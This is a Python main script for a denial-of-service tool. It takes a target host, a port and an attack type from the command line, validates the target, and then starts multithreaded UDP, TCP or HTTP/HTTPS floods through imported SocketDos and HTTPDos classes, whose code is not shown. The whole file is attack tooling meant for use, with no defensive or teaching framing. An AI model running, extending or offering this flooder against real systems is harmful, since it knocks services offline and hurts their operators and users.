from src import show_banner
from src.arg_parser import arg_parser
from src import TargetValidator
from src.dos import HTTPDos, SocketDos, TCP, UDP
from src.utils import *


def main():
    args = arg_parser()
    trying_connection(args)


def resume(args):

    color_text(
        'yellow', f'target: {args.target}, port: {args.port}, attack: {args.attack}, packet number: {args.count if args.count else "Infinite"},\n')


def trying_connection(args):
    target = args.target
    target_port = args.port
    attack_type = args.attack
    http_method = args.method
    resume(args)

    target_validator = TargetValidator(args)
    target_validated = target_validator.validate()

    if target_validated:
        print('Packet sending ...')
        attack(target, target_port, attack_type, http_method=http_method)
    else:
        print('End !')


def attack(target, target_port, attack_type, http_method=None):
    """
    target
    target_port
    attack_type: attack method like: UDP, HTTP
    """
    if attack_type == 'udp':
        dos_attacks = SocketDos(target, target_port, UDP, thread_number=20)
        return dos_attacks.start_attack()
    elif attack_type == 'tcp':
        dos_attacks = SocketDos(target, target_port, TCP, thread_number=20)
        return dos_attacks.start_attack()
    elif attack_type == 'http' or attack_type == 'https':
        dos_attacks = HTTPDos(target, target_port, attack_type,
                              http_method=http_method, thread_number=6)
        return dos_attacks.start_attack()


if __name__ == "__main__":
    show_banner()
    main()
